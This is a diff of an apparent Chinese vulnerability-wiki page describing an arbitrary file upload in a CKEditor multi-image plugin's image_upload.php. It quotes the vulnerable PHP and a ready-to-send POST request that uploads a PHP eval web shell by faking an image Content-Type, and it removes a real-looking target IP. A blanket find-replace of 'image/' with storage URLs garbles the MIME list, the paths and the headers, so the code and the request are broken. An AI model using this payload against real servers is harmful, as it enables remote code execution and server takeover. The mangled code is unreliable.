@@ -20,7 +20,7 @@
 
 登录页面如下
 
-![](image/szy-1.png)
+![](http://wikioss.peiqi.tech/vuln/szy-1.png)
 
 漏洞文件为 CK编辑器的 image_upload.php
 
@@ -31,15 +31,15 @@
 define ( 'ROOT_PATH', '../../../../' );  // back to your root path
 
 $arrType = array (
-		'image/jpg',
-		'image/gif',
-		'image/png',
-		'image/bmp',
-		'image/pjpeg',
-		'image/jpeg' 
+		'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jpg',
+		'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif',
+		'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/png',
+		'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/bmp',
+		'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/pjpeg',
+		'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jpeg' 
 );
 $max_size = 500 * 1024; // 最大文件限制（单位：byte）
-$upfile = ROOT_PATH.'image/uploads'; // 图片目录路径
+$upfile = ROOT_PATH.'http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads'; // 图片目录路径
 if (!isset($_FILES ['files'])){
 	echo '{"result":"400","msg":"未能找到图片，请确认图片是否过大"}';
 	exit ();
@@ -78,35 +78,35 @@ if ($_SERVER ['REQUEST_METHOD'] == 'POST') { // 判断提交方式是否为POST
 		echo '{"result":"400","msg":"从:'.$file ['tmp_name'].'移动图片到:'.$picName.'出错"}';
 		exit ();
 	} else {
-		echo '{"result":"200","imgurl":"image/uploads/' . $returnName . '"}';
+		echo '{"result":"200","imgurl":"http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/' . $returnName . '"}';
 	}
 }
 
 ?>
 ```
 
-其中使用 **Content-Type: image/gif**  即可绕过上传PHP文件
+其中使用 **Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif**  即可绕过上传PHP文件
 
 ```
 POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2
-Host: 47.95.36.147
+Host: 
 Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
 Content-Length: 208
 
 ------WebKitFormBoundary8UaANmWAgM4BqBSs
 Content-Disposition: form-data; name="files"; filename="test.php"
-Content-Type: image/gif
+Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif
 
 <?php @eval($_POST[pq]);?>
 ------WebKitFormBoundary8UaANmWAgM4BqBSs—
 ```
 
-![](image/szy-5.png)
+![](http://wikioss.peiqi.tech/vuln/szy-5.png)
 
 访问返回的文件路径 
 
 ```
-/Common/image/uploads/xxxxx.php
+/Common/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/xxxxx.php
 ```
 
-![](image/szy-4.png)
+![](http://wikioss.peiqi.tech/vuln/szy-4.png)
